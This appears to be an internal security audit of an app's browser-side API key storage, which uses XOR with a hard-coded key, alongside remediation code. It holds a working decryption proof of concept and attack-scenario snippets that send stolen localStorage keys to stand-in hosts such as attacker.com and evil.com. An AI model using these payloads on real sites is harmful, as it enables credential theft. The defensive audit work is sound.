# API Key Security Analysis

## Current Architecture

### Storage Mechanism

**Location**: [src/lib/storage/secure-storage.ts](../src/lib/storage/secure-storage.ts)

#### 1. Storage Pattern
API keys are stored using a **dual-storage approach**:

```
┌─────────────────────────────────────┐
│  localStorage (Plain)               │
│  Key: 'dynamo-ai-providers'         │
│                                     │
│  Stores:                            │
│  - Provider metadata                │
│  - Masked keys (first 7 + last 4)  │
│  - Provider ID, name, models        │
└─────────────────────────────────────┘
              +
┌─────────────────────────────────────┐
│  localStorage (Encrypted)           │
│  Key: 'api_key_{provider.id}'      │
│                                     │
│  Stores:                            │
│  - Full API key (encrypted)         │
└─────────────────────────────────────┘
```

#### 2. Encryption Implementation

**Algorithm**: Simple XOR cipher with Base64 encoding

```typescript
// Location: secure-storage.ts:18-31
private static encrypt(text: string, key: string): string {
  let result = ''
  for (let i = 0; i < text.length; i++) {
    const charCode = text.charCodeAt(i) ^ key.charCodeAt(i % key.length)
    result += String.fromCharCode(charCode)
  }
  return btoa(result) // Base64 encode
}
```

**Encryption Key**: Hard-coded static string
```typescript
// Location: secure-storage.ts:6
const ENCRYPTION_KEY = 'dynamo-ai-secure-key-2024'
```

**Key Derivation**:
```typescript
// Location: secure-storage.ts:9-16
private static generateKey(password: string, salt: string): string {
  let key = password + salt
  for (let i = 0; i < 1000; i++) {
    key = btoa(key).slice(0, 32)
  }
  return key
}
```

- Uses random salt (generated per storage operation)
- 1000 iterations of Base64 encoding
- Not cryptographically secure (no PBKDF2, bcrypt, or Argon2)

### Access Flow

```
User Creates Provider
        ↓
APIKeyStorage.saveProviders()
        ↓
   ┌────────────────────────┐
   │ 1. Save metadata to    │
   │    plain localStorage  │
   │    (masked keys)       │
   └────────────────────────┘
        ↓
   ┌────────────────────────┐
   │ 2. For each provider:  │
   │    SecureStorage.      │
   │    setItem(            │
   │      `api_key_{id}`,   │
   │      fullAPIKey        │
   │    )                   │
   └────────────────────────┘
        ↓
   ┌────────────────────────┐
   │ 3. Encrypt with XOR    │
   │    using derived key   │
   └────────────────────────┘
        ↓
   Store in localStorage
```

#### Retrieval Flow

```
Evaluation Runs
        ↓
APIKeyStorage.loadProviders()
        ↓
   ┌────────────────────────┐
   │ 1. Load metadata from  │
   │    localStorage        │
   └────────────────────────┘
        ↓
   ┌────────────────────────┐
   │ 2. For each provider:  │
   │    SecureStorage.      │
   │    getItem(            │
   │      `api_key_{id}`    │
   │    )                   │
   └────────────────────────┘
        ↓
   ┌────────────────────────┐
   │ 3. Decrypt with XOR    │
   └────────────────────────┘
        ↓
   Return full API key in memory
        ↓
   Used in API calls (evalRunner.ts:74)
```

## Security Vulnerabilities

### 🔴 CRITICAL Vulnerabilities

#### 1. **Hard-coded Encryption Key** (CVSS 9.1 - Critical)

**Issue**: The encryption key is hard-coded in the source code:
```typescript
const ENCRYPTION_KEY = 'dynamo-ai-secure-key-2024'
```

**Attack Vector**:
- Anyone with access to the compiled JavaScript can extract this key
- Open browser DevTools → Sources → Search for "dynamo-ai-secure-key"
- The key is visible in minified production builds

**Impact**: Complete compromise of all API keys

**Exploit Steps**:
```javascript
// In browser console:
1. Open DevTools → Sources
2. Search: "dynamo-ai-secure-key-2024"
3. Found encryption key
4. Read encrypted data from localStorage
5. Decrypt manually using same XOR algorithm
```

**Proof of Concept**:
```javascript
// Attacker can run this in console:
function decrypt(encryptedText, key) {
  const text = atob(encryptedText);
  let result = '';
  for (let i = 0; i < text.length; i++) {
    result += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
  }
  return result;
}

// Get stored encrypted key
const stored = localStorage.getItem('api_key_some-provider-id');
const data = JSON.parse(stored);
const salt = data.salt;

// Derive key (same algorithm)
let key = 'dynamo-ai-secure-key-2024' + salt;
for (let i = 0; i < 1000; i++) {
  key = btoa(key).slice(0, 32);
}

// Decrypt
const apiKey = decrypt(data.value, key);
console.log('Stolen API Key:', apiKey);
```

#### 2. **Weak Encryption Algorithm** (CVSS 7.4 - High)

**Issue**: Uses XOR cipher instead of industry-standard AES

**Problems**:
- XOR is a **symmetric stream cipher** that's trivially breakable
- No authentication (HMAC/GCM)
- Vulnerable to known-plaintext attacks
- Vulnerable to ciphertext manipulation

**Attack Vector - Known Plaintext**:
```javascript
// If attacker knows one API key starts with "sk-" (OpenAI format)
// They can derive the encryption key:
const knownPlaintext = "sk-";
const ciphertext = encryptedData.substring(0, 3);
const keyFragment = knownPlaintext.split('').map((c, i) =>
  c.charCodeAt(0) ^ ciphertext.charCodeAt(i)
);
// Use keyFragment to decrypt rest of message
```

#### 3. **Client-Side Storage** (CVSS 6.5 - Medium)

**Issue**: API keys stored in localStorage are accessible to:

**Attack Vectors**:

a) **XSS (Cross-Site Scripting)**:
```javascript
// If attacker injects script into your app:
<img src=x onerror="
  const keys = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    if (key.startsWith('api_key_')) {
      keys[key] = localStorage.getItem(key);
    }
  }
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(keys)
  });
">
```

b) **Browser Extensions**:
- Any installed extension with `storage` permission can read localStorage
- Malicious extensions can exfiltrate all keys silently

c) **Physical Access**:
```javascript
// On unlocked computer:
1. Open DevTools (F12)
2. Console: localStorage
3. Copy all api_key_* entries
4. Decrypt offline
```

d) **Shared Computers**:
- localStorage persists across sessions
- Keys remain until explicitly cleared
- No automatic expiration

#### 4. **No Key Rotation** (CVSS 5.3 - Medium)

**Issue**: Once stored, keys never expire or rotate

**Attack Vector**:
- Old/compromised keys remain accessible indefinitely
- No mechanism to invalidate stolen keys
- No audit trail of key usage

### 🟡 MEDIUM Vulnerabilities

#### 5. **Insufficient Key Derivation** (CVSS 5.9 - Medium)

**Issue**: Key derivation is not cryptographically secure

```typescript
for (let i = 0; i < 1000; i++) {
  key = btoa(key).slice(0, 32)
}
```

**Problems**:
- Base64 encoding is **not** a cryptographic hash
- Only 1000 iterations (PBKDF2 recommends 100,000+)
- Predictable output
- No use of HMAC or proper KDF

**Should Use**:
- PBKDF2 with SHA-256, 100,000+ iterations
- Or Argon2id (modern alternative)

#### 6. **Salt Reuse Risk** (CVSS 4.3 - Medium)

**Issue**: Salt is generated per storage operation but stored in plaintext

```typescript
const salt = Math.random().toString(36).substring(2, 15)
```

**Problems**:
- `Math.random()` is **not** cryptographically secure
- Predictable PRNG (Pseudo-Random Number Generator)
- Salt stored alongside ciphertext in localStorage (accessible)

#### 7. **No Integrity Protection** (CVSS 6.1 - Medium)

**Issue**: No HMAC or authentication tag

**Attack Vector - Ciphertext Manipulation**:
```javascript
// Attacker can modify encrypted data without detection
const stored = JSON.parse(localStorage.getItem('api_key_xyz'));
// Flip bits in encrypted value
stored.value = modifiedCiphertext;
localStorage.setItem('api_key_xyz', JSON.stringify(stored));
// Decryption will produce garbage but no error/warning
```

### 🟢 LOW Vulnerabilities

#### 8. **Logging Sensitive Data** (CVSS 3.1 - Low)

**Issue**: API keys may appear in console logs

```typescript
// evalRunner.ts:76
console.log('🔍 Debug: Loaded providers:', providers);
```

**Risk**:
- Developers may screenshot console for debugging
- Console history persists in browser
- Could leak in error reports

#### 9. **Memory Exposure** (CVSS 3.7 - Low)

**Issue**: Decrypted keys exist in JavaScript memory

**Attack Vector**:
- Browser memory dumps
- DevTools heap snapshots
- Debugger breakpoints to inspect variables

## Attack Scenarios

### Scenario 1: Malicious Browser Extension

```
1. User installs legitimate-looking extension
2. Extension requests 'storage' permission
3. Extension code:

   chrome.storage.local.get(null, (items) => {
     const apiKeys = {};
     for (const [key, value] of Object.entries(items)) {
       if (key.startsWith('api_key_')) {
         apiKeys[key] = value;
       }
     }

     // Also check localStorage via content script
     chrome.tabs.executeScript({
       code: `
         const keys = {};
         for (let i = 0; i < localStorage.length; i++) {
           const k = localStorage.key(i);
           if (k.startsWith('api_key_')) {
             keys[k] = localStorage.getItem(k);
           }
         }
         keys;
       `
     }, (results) => {
       sendToAttacker(results[0]);
     });
   });
```

### Scenario 2: XSS via Third-Party Library

```
1. Vulnerable npm dependency has XSS
2. Injected script runs:

   const steal = () => {
     const data = {
       keys: {},
       metadata: localStorage.getItem('dynamo-ai-providers')
     };

     for (let i = 0; i < localStorage.length; i++) {
       const key = localStorage.key(i);
       if (key.startsWith('api_key_')) {
         data.keys[key] = localStorage.getItem(key);
       }
     }

     navigator.sendBeacon('https://evil.com/collect', JSON.stringify(data));
   };

   steal();
```

### Scenario 3: Physical Access

```
1. Attacker gains physical access to unlocked laptop
2. Opens DevTools (F12)
3. Console:

   // Extract all encrypted keys
   const encryptedKeys = {};
   for (let i = 0; i < localStorage.length; i++) {
     const key = localStorage.key(i);
     if (key.startsWith('api_key_')) {
       encryptedKeys[key] = localStorage.getItem(key);
     }
   }

   // Copy encryption key from source
   const ENCRYPTION_KEY = 'dynamo-ai-secure-key-2024';

   // Decrypt all keys using same algorithm from source
   // (Copy decrypt function from secure-storage.ts)

4. Exfiltrate to USB drive or cloud
5. Decrypt offline at leisure
```

### Scenario 4: Supply Chain Attack

```
1. Compromised npm package in dependencies
2. Malicious code injected during build:

   // In node_modules/compromised-package/index.js
   if (typeof window !== 'undefined') {
     window.addEventListener('load', () => {
       setTimeout(() => {
         const exfil = {};
         for (const key in localStorage) {
           if (key.includes('api') || key.includes('key')) {
             exfil[key] = localStorage[key];
           }
         }
         fetch('https://attacker-domain.com/log', {
           method: 'POST',
           body: JSON.stringify(exfil)
         });
       }, 5000);
     });
   }
```

## Recommended Mitigations

### Immediate Actions (Within 1 Week)

#### 1. **Move to Backend Key Management** ⭐ HIGHEST PRIORITY

**Why**: Client-side encryption is inherently insecure. The encryption key must be in the JavaScript, making it accessible to attackers.

**Implementation**:
```
Current:
┌──────────────┐
│   Browser    │
│  (localStorage)│ ← API keys stored here
└──────────────┘

Recommended:
┌──────────────┐
│   Browser    │ ← Only stores reference IDs
└──────┬───────┘
       │
       ↓ HTTPS
┌──────────────┐
│   Backend    │ ← API keys stored here (encrypted at rest)
│  (Supabase)  │ ← Use Vault for secrets
└──────────────┘
```

**Benefits**:
- Keys never exposed to client
- Server-side encryption with HSM (Hardware Security Module)
- Centralized key rotation
- Audit logging

**Migration Path**:
You're already implementing Supabase! Perfect timing:

```typescript
// Instead of storing keys in localStorage:
// Store in Supabase with RLS (Row Level Security)

// Client code:
const createAISystem = async (name, model, apiKeyReference) => {
  // Don't send actual API key to client
  await supabase.from('ai_systems').insert({
    name,
    model,
    api_key_reference_id: apiKeyReference // Just an ID
  });
};

// Server (Edge Function):
const runEvaluation = async (systemId) => {
  // Fetch API key from secure backend storage
  const { data } = await supabase.from('api_keys')
    .select('encrypted_key')
    .eq('id', apiKeyReference)
    .single();

  // Decrypt server-side using secret from Supabase Vault
  const apiKey = decryptWithVault(data.encrypted_key);

  // Make API call
  const result = await openai.chat.completions.create({
    api_key: apiKey,
    // ...
  });
};
```

#### 2. **Implement Web Crypto API** (If keeping client-side)

**Replace XOR with AES-GCM**:

```typescript
// secure-storage-v2.ts
export class SecureStorageV2 {
  private static async deriveKey(password: string, salt: Uint8Array): Promise<CryptoKey> {
    const encoder = new TextEncoder();
    const passwordKey = await crypto.subtle.importKey(
      'raw',
      encoder.encode(password),
      'PBKDF2',
      false,
      ['deriveKey']
    );

    return crypto.subtle.deriveKey(
      {
        name: 'PBKDF2',
        salt: salt,
        iterations: 100000, // Industry standard
        hash: 'SHA-256'
      },
      passwordKey,
      { name: 'AES-GCM', length: 256 },
      false,
      ['encrypt', 'decrypt']
    );
  }

  static async encrypt(text: string, password: string): Promise<string> {
    const encoder = new TextEncoder();
    const salt = crypto.getRandomValues(new Uint8Array(16));
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const key = await this.deriveKey(password, salt);

    const encrypted = await crypto.subtle.encrypt(
      { name: 'AES-GCM', iv: iv },
      key,
      encoder.encode(text)
    );

    // Combine salt + iv + ciphertext
    const combined = new Uint8Array(salt.length + iv.length + encrypted.byteLength);
    combined.set(salt, 0);
    combined.set(iv, salt.length);
    combined.set(new Uint8Array(encrypted), salt.length + iv.length);

    return btoa(String.fromCharCode(...combined));
  }

  static async decrypt(encryptedText: string, password: string): Promise<string> {
    const combined = Uint8Array.from(atob(encryptedText), c => c.charCodeAt(0));

    const salt = combined.slice(0, 16);
    const iv = combined.slice(16, 28);
    const ciphertext = combined.slice(28);

    const key = await this.deriveKey(password, salt);

    const decrypted = await crypto.subtle.decrypt(
      { name: 'AES-GCM', iv: iv },
      key,
      ciphertext
    );

    return new TextDecoder().decode(decrypted);
  }
}
```

**Benefits**:
- AES-256-GCM (authenticated encryption)
- PBKDF2 with 100,000 iterations
- Cryptographically secure random (crypto.getRandomValues)
- Built into all modern browsers

#### 3. **Add Content Security Policy**

```html
<!-- index.html -->
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' 'unsafe-inline' 'unsafe-eval';
  connect-src 'self' https://api.openai.com https://*.supabase.co;
  img-src 'self' data: https:;
  style-src 'self' 'unsafe-inline';
">
```

**Prevents**:
- XSS attacks
- Unauthorized script execution
- Data exfiltration to unknown domains

### Short-term Actions (Within 1 Month)

#### 4. **Implement Key Expiration**

```typescript
interface StoredAPIKey {
  value: string;
  salt: string;
  timestamp: number;
  expiresAt: number; // Add expiration
}

static getItem(key: string): string | null {
  const stored = localStorage.getItem(key);
  if (!stored) return null;

  const data: StoredAPIKey = JSON.parse(stored);

  // Check expiration
  if (Date.now() > data.expiresAt) {
    this.removeItem(key);
    return null;
  }

  return this.decrypt(data.value, this.deriveKey(ENCRYPTION_KEY, data.salt));
}
```

#### 5. **Add Audit Logging**

```typescript
interface KeyAccessLog {
  keyId: string;
  action: 'created' | 'accessed' | 'deleted' | 'failed_decrypt';
  timestamp: number;
  userAgent: string;
  ipHash?: string; // If backend available
}

static logAccess(keyId: string, action: KeyAccessLog['action']) {
  const logs = JSON.parse(localStorage.getItem('key_access_logs') || '[]');
  logs.push({
    keyId,
    action,
    timestamp: Date.now(),
    userAgent: navigator.userAgent
  });

  // Keep last 100 logs
  localStorage.setItem('key_access_logs', JSON.stringify(logs.slice(-100)));
}
```

#### 6. **Implement Subresource Integrity**

```html
<!-- Verify CDN scripts haven't been tampered with -->
<script
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux..."
  crossorigin="anonymous"
></script>
```

### Long-term Actions (Within 3 Months)

#### 7. **Move to Supabase Vault** (Recommended)

Supabase provides a secrets management system:

```sql
-- Store API keys in Supabase Vault
SELECT vault.create_secret('openai_api_key', 'sk-...');

-- Access in Edge Functions only (server-side)
SELECT decrypted_secret FROM vault.decrypted_secrets
WHERE name = 'openai_api_key';
```

**Architecture**:
```
User Request
     ↓
Frontend (no API keys)
     ↓ HTTPS
Edge Function (server-side)
     ↓
Supabase Vault (encrypted at rest with master key)
     ↓
Decrypt & use API key
     ↓
Call OpenAI API
```

#### 8. **Implement OAuth/API Key Proxying**

Instead of storing user's OpenAI keys, use your own:

```
User → Your Backend → OpenAI API
         ↑
    Your API Key (secure)
    User tracked by session
```

**Benefits**:
- Single point of key management
- Usage tracking & rate limiting
- Billing control
- Key rotation without user impact

## Summary: Risk Assessment

| Vulnerability | Severity | Exploitability | Impact | Priority |
|---------------|----------|----------------|---------|----------|
| Hard-coded encryption key | Critical | Easy | Complete compromise | P0 |
| Weak encryption (XOR) | High | Medium | Key extraction | P0 |
| Client-side storage | Medium | Easy | Key theft via XSS/extension | P1 |
| No key rotation | Medium | N/A | Persistent compromise | P1 |
| Weak KDF | Medium | Medium | Faster brute force | P2 |
| No integrity protection | Medium | Hard | Ciphertext manipulation | P2 |
| Insecure salt generation | Low | Hard | Predictable salts | P3 |
| Logging sensitive data | Low | Easy | Information disclosure | P3 |

## Conclusion

**Current Security Level**: 🔴 **CRITICAL RISK**

The current implementation provides **security theater** rather than actual protection. An attacker with any of the following can extract API keys:

✅ Browser console access
✅ Malicious browser extension
✅ XSS vulnerability
✅ Access to JavaScript source
✅ Physical access to computer

**Recommended Path Forward**:

1. **Immediate** (This Week): Migrate to Supabase backend storage
2. **Short-term** (This Month): Implement Web Crypto API if client-side storage required
3. **Long-term** (3 Months): Move to Supabase Vault + proxy architecture

**The only truly secure solution is server-side key management**. Your migration to Supabase is the perfect opportunity to implement this correctly.
